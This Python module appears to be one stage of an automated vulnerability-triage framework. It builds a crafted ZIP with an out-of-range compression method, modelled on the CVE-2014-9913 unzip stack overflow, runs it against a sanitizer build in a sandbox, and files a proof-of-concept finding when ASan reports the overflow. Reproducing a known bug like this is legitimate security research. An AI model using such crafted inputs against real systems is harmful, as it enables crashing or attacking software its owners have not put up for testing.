"""Stage: drive a ZIP-field stack buffer overflow to L1, directed, no fuzzing.

A ZIP-reading target that renders an out-of-range central-directory field into a fixed-size stack
buffer (`sprintf(&methbuf[4], "%03u", compression_method)`, the unzip / CVE-2014-9913 shape) is
reachable without a campaign: construct the smallest valid ZIP whose one entry carries an
out-of-range compression method (`zip_overflow.zip_overmethod`), then detonate it against the
sanitizer build under the verbose-list invocation that reaches the sink. The archive is a VALID
container -- a raw oversized blob would be rejected by the central-directory parser long before the
sink -- which is why a directed, format-aware construction lands what a blind fuzzer does not.

Self-skipping and 0-FP: it runs only on a ZIP-reading target, tries a small set of list-mode
invocations, and files L1 only on an actual stack-buffer-overflow WRITE whose ASan frame names the
rendering sink. The overrun here is a 1-2 byte ASCII digit write past an 8-byte buffer: that is an
honest L1 (a reproduced stack overflow), not control-flow -- the write is too small and too
constrained (decimal digits) to reach a saved return address. Lifting a ZIP overflow to L3 needs a
sink whose overrun length and bytes are attacker-controlled enough to overwrite the saved frame;
this bug does not offer that, and the finding says so rather than over-claiming.
"""
from __future__ import annotations

import os

from ...db.dao import DynResultDAO, FindingDAO, PocDAO, StringDAO, TargetDAO
from ...jobs.registry import register_stage
from ..dynamic import sandbox
from ..dynamic.stage import (asan_defect_key, crash_dedup_key, crash_finding_candidate,
                             crash_key_parts, sanitizer_hit)
from ..invocation import staged_name as _staged_name
from . import bundle, zip_overflow

STAGE = "zip_overflow"
TOOL = "zipflow"
TOOL_VERSION = "zipflow-1"

_ZIP_TOKENS = ("central directory", "zipfile", "End-of-central", "PKZIP")
# List-mode invocations that reach a method-rendering sink. `-v` reaches list_files (list.c:342);
# `-Z` reaches the zipinfo sinks (zi_short/zi_long). The input path is appended as the last arg.
_ARGV_VARIANTS = (["-v"], ["-Z"], ["-l"])


def _reads_zip(ctx, target) -> bool:
    """Does this target read ZIP archives? True when its recovered strings carry a ZIP-reader
    marker -- the same evidence the format detector uses to seed a ZIP campaign."""
    try:
        for s in StringDAO(ctx.conn).list_by_target(target.id):
            v = getattr(s, "value", None)
            if v and any(tok in v for tok in _ZIP_TOKENS):
                return True
    except Exception:                                    # noqa: BLE001 -- gate is best-effort
        pass
    try:
        data = ctx.content.path(target.sha256).read_bytes()
        return any(tok.encode() in data for tok in _ZIP_TOKENS)
    except Exception:                                    # noqa: BLE001
        return False


def _run(exe, argv_prefix, zip_path, target, timeout):
    return sandbox.run(exe, argv=[*argv_prefix, str(zip_path)], stdin=b"", timeout=timeout,
                       arch=target.arch, endianness=target.endianness, bits=target.bits)


def zip_overflow_stage(ctx) -> dict:
    target = TargetDAO(ctx.conn).get(ctx.target_id) if ctx.target_id else None
    if target is None:
        raise ValueError("zip_overflow requires a target_id")
    p = ctx.params or {}
    timeout = float(p.get("timeout", 8))

    from .. import substrate
    why = (substrate.foreign_cpu_reason(target.arch, target.file_type, sandbox.host_arch(),
                                        "ZIP overflow")
           or substrate.native_only_reason(target.file_type, "ZIP overflow"))
    if why:
        ctx.emit("zipflow.done", payload={"applicable": False, "note": why})
        return {}
    if not _reads_zip(ctx, target):
        ctx.emit("zipflow.done", payload={"applicable": False,
                                          "note": "target does not read ZIP (no ZIP-reader marker)"})
        return {}

    target_bytes = ctx.content.path(target.sha256).read_bytes()
    exe = ctx.scratch() / _staged_name(ctx, target)
    ctx.content.stage_target(target, exe.parent, exe.name)
    os.chmod(exe, 0o755)

    zdata = zip_overflow.zip_overmethod(two_byte=True)
    zpath = ctx.scratch() / "overmethod.zip"
    zpath.write_bytes(zdata)

    res, argv_prefix = None, None
    for variant in _ARGV_VARIANTS:
        ctx.progress(msg=f"detonating a constructed over-method ZIP ({' '.join(variant)})")
        r = _run(exe, variant, zpath, target, timeout)
        # A sanitizer-reported stack overflow is confirmed whether ASan aborted or exited cleanly
        # (the run() path does not force abort_on_error, so a redzone-caught WRITE exits code 1 with
        # no signal -- gating on r.crashed alone dropped this real overflow).
        if sanitizer_hit(r, (b"stack-buffer-overflow", b"WRITE of size")):
            res, argv_prefix = r, variant
            break
    if res is None:
        ctx.emit("zipflow.done", payload={"applicable": True,
                 "note": "the constructed ZIP did not reproduce a stack-overflow WRITE under any "
                         "list-mode invocation here"})
        return {}

    mode = "file"
    argv_base = list(argv_prefix) + ["@@"]
    input_sha = ctx.put_artifact("zipflow-crash-input", data=zdata)
    # A sanitizer error that EXITED (no signal) is morally an abort; key it as SIGABRT so the
    # finding/bundle/dedup agree with the signalled case and `asan_defect_key` discriminates it.
    eff_signal = res.signal_name or "SIGABRT"
    defect_key = asan_defect_key(res.stderr)
    DynResultDAO(ctx.conn).insert(
        target.id, target.case_id, run_id=ctx.run_id, input_sha=input_sha, input_mode=mode,
        argv=list(argv_base), signal=res.signal, signal_name=eff_signal, crashed=True,
        isolation=res.isolation, duration_ms=res.duration_ms, fault_pc=res.fault_pc,
        defect_key=defect_key, note="constructed ZIP compression-method overflow; no fuzzing")
    meta = {"target_sha256": target.sha256, "arch": target.arch, "input_mode": mode,
            "argv": argv_base, "expected_signal": eff_signal, "isolation": res.isolation,
            "verified": True, "level": "L1", "constructed": True, "tool_version": TOOL_VERSION}
    data = bundle.build(target_bytes, zdata, meta, res.stderr, mode, argv_base, eff_signal)
    bundle_sha = ctx.put_artifact("poc-bundle", data=data, meta={"verified": True, "level": "L1"})
    poc_id = PocDAO(ctx.conn).insert(target.id, target.case_id, level="L1", verified=True,
                                     signal_name=eff_signal, input_sha=input_sha,
                                     bundle_sha=bundle_sha)
    fd = FindingDAO(ctx.conn)
    fault_pc, disc, _ = crash_key_parts(ctx.conn, target.id, input_sha)
    fd.upsert(target.id, target.case_id, crash_finding_candidate(
        eff_signal, input_sha, res.isolation, "zip_overflow",
        "(constructed ZIP: an out-of-range compression_method rendered into a fixed stack buffer "
        "-> stack-buffer-overflow WRITE behind the ZIP parser; no fuzzing)",
        state="poc-backed", confidence=0.95, bundle_sha=bundle_sha, fault_pc=fault_pc,
        discriminator=disc, file_type=target.file_type))
    fid = fd.id_for_dedup(target.id, crash_dedup_key(eff_signal, fault_pc, disc))
    if fid:
        PocDAO(ctx.conn).set_finding(poc_id, fid)
    ctx.emit("zipflow.l1", payload={"level": "L1", "bundle": bundle_sha, "input_sha": input_sha,
             "argv": argv_base})
    ctx.progress(pct=100, msg=f"ZIP compression-method overflow: L1 reproduced ({' '.join(argv_prefix)})")
    return {"output_shas": [bundle_sha], "output_kind": "poc-bundle"}


def register() -> None:
    register_stage(STAGE, zip_overflow_stage, resource_class="cpu",
                   tool=TOOL, tool_version=TOOL_VERSION, timeout=120)


def enqueue_zip_overflow(queue, target, *, params=None, force: bool = True):
    return queue.enqueue(target.case_id, STAGE, target_id=target.id, params=params or {},
                         input_hashes=[target.sha256], tool=TOOL, tool_version=TOOL_VERSION,
                         resource_class="cpu", force=force)
